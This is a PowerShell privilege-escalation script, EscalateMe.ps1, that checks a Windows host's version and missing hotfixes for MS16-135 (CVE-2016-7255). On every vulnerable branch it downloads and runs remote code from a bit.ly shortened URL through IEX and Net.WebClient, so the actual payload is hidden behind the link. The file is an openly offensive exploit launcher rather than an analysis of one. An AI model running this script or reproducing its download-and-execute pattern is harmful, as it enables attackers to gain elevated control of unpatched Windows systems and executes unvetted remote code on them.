<#
    File: EscalateMe.ps1
    Author: @xillwillx
    License: GNU General Public License v3.0
#> 

function Get-OSVersion {
$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
$Script:OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
}

#######################################################################################################################################
# CVE-2016-7255 / MS16-135  Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' PrivEsc
# Based on the work of @FuzzySec & @TinySecEx
# https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
# Win7  / Windows Server 2008 R2 SP1 - KB3197867
# Win8  / Windows Server 2012 - KB3197876 
# Win8.1/ Windows Server 2012 R2 - KB3197873
# Win10 - Pre Anniversary Edition Build 14393
#######################################################################################################################################

function MS16-135{
    	Get-OSVersion
	echo "[?] Checking for MS16-135"
  switch ($OSMajorMinor)
  {
	'10.0' # Win10 / 2k16
	{	echo "[?] Target is Win 10 `n[+] Checking for Pre-Anniversary Edition Build"
		if((!([System.IntPtr]::Size -ne 8)) -And ($OSVersion.Build -lt 14393)){"[!] Exploiting!";IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2oQYZ1H')}else{"[x] Not Exploitable!"}
	}

	'6.3' # Win8.1 / 2k12R2
	{	echo "[?] Target is Win 8.1 `n[+] Checking if x64 and for KB3197873 patch"
		if((!([System.IntPtr]::Size -ne 8)) -And (!(get-hotfix -id KB3197873 -ea 0))){"[!] Exploiting!";IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2oQYZ1H')}else{"[x] Not Exploitable!"}
	}

	'6.2' # Win8 / 2k12
	{	echo "[?] Target is Win 8 `n[+] Checking x64 and for KB3197876 patch"
		if((!([System.IntPtr]::Size -ne 8)) -And (!(get-hotfix -id KB3197876 -ea 0))){"[!] Exploiting!";IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2oQYZ1H')}else{"[x] Not Exploitable!"}
	}

	'6.1' # Win7 / 2k8R2
	{	 echo "[?] Target is Win 7 `n[+] Checking x64 and for KB3197867 patch"
		if((!([System.IntPtr]::Size -ne 8)) -And (!(get-hotfix -id KB3197867 -ea 0))){"[!] Exploiting!";IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2oQYZ1H')}else{"[x] Not Exploitable!"}
	}
  }
}
